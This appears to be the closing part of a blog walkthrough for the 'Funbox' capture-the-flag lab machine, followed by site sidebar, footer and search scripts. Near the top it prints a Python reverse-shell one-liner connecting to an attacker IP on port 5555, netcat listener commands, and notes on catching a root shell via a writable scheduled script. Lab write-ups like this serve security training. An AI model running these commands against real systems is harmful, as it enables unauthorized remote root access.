+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bashtar -cf /home/funny/html.tar /var/www/htmlpython -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.49.73&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>
+
+<p>等待2分钟获得了反弹的Shell进行退出</p>
+<p>再次进行端口监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>
+
+<p>等待5分钟即可获得ROOT权限的Shell</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Reverse-Shell/" rel="tag"># Reverse Shell</a>
+          
+            <a href="/tags/Brute-Force/" rel="tag"># Brute-Force</a>
+          
+            <a href="/tags/Script/" rel="tag"># Script</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/undefined/Born2Root/" rel="next" title="Born2Root">
+                <i class="fa fa-chevron-left"></i> Born2Root
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/undefined/Tre/" rel="prev" title="Tre">
+                Tre <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/Sevion3.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+               <a href="/archives/">
+	      <!-- <a href="/archives/%7C%7C%20fa-solid%20fa-align-center"> -->
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Sev1on" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-fab fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://discord.gg/8gyzR5Y52X" target="_blank" title="Discord">
+                      
+                        <i class="fa fa-fw fa-fa-solid fa-link"></i>Discord</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://t.me/pay1oad" target="_blank" title="Telegram">
+                      
+                        <i class="fa fa-fw fa-fab fa-telegram"></i>Telegram</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploitation-Guide-for-Funbox"><span class="nav-number">1.</span> <span class="nav-text">Exploitation Guide for Funbox</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">1.1.</span> <span class="nav-text">Summary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration"><span class="nav-number">1.2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">1.2.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FTP"><span class="nav-number">1.2.2.</span> <span class="nav-text">FTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Enumeration"><span class="nav-number">1.2.3.</span> <span class="nav-text">Web Enumeration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation"><span class="nav-number">1.3.</span> <span class="nav-text">Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH-Brute-Force"><span class="nav-number">1.3.1.</span> <span class="nav-text">SSH Brute Force</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shell-Breakout"><span class="nav-number">1.3.2.</span> <span class="nav-text">Shell Breakout</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Escalation"><span class="nav-number">1.4.</span> <span class="nav-text">Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Insecure-File-Permissions"><span class="nav-number">1.4.1.</span> <span class="nav-text">Insecure File Permissions</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"> </span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+  <div id="site-runtime">
+  <span class="post-meta-item-icon">
+    <i class="fa fa-clock-o"></i>
+  </span>
+  <span id="runtime"></span>
+</div>
+
+<script language="javascript">
+  function isPC() {
+    var userAgentInfo = navigator.userAgent;
+    var agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
+    for (var i = 0; i < agents.length; i++) {
+      if (userAgentInfo.indexOf(agents[i]) > 0) {
+        return false;
+      }
+    }
+    return true;
+  }
+
+  function siteTime(openOnPC, start) {
+    window.setTimeout("siteTime(openOnPC, start)", 1000);
+    var seconds = 1000;
+    var minutes = seconds * 60;
+    var hours = minutes * 60;
+    var days = hours * 24;
+    var years = days * 365;
+      start = new Date("2013-11-23 09:00:00 +0800");
+    var now = new Date();
+    var year = now.getFullYear();
+    var month = now.getMonth() + 1;
+    var date = now.getDate();
+    var hour = now.getHours();
+    var minute = now.getMinutes();
+    var second = now.getSeconds();
+    var diff = now - start;
+
+    var diffYears = Math.floor(diff / years);
+    var diffDays = Math.floor((diff / days) - diffYears * 365);
+    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+
+    if (openOnPC) {
+      document.getElementById("runtime").innerHTML = "Running: " + diffYears + " years " + diffDays + " days " + diffHours + " hours " + diffMinutes + " mins " + diffSeconds + " secs";
+    } else {
+      document.getElementById("runtime").innerHTML = "Running: " + diffYears + "y " + diffDays + "d " + diffHours + "h " + diffMinutes + "m " + diffSeconds + "s";
+    }
+  }
+
+  var showOnMobile = false;
+  var openOnPC = isPC();
+  var start = new Date();
+  siteTime(openOnPC, start);
+
+  if (!openOnPC && !showOnMobile) {
+    document.getElementById('site-runtime').style.display = 'none';
+  }
+</script>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
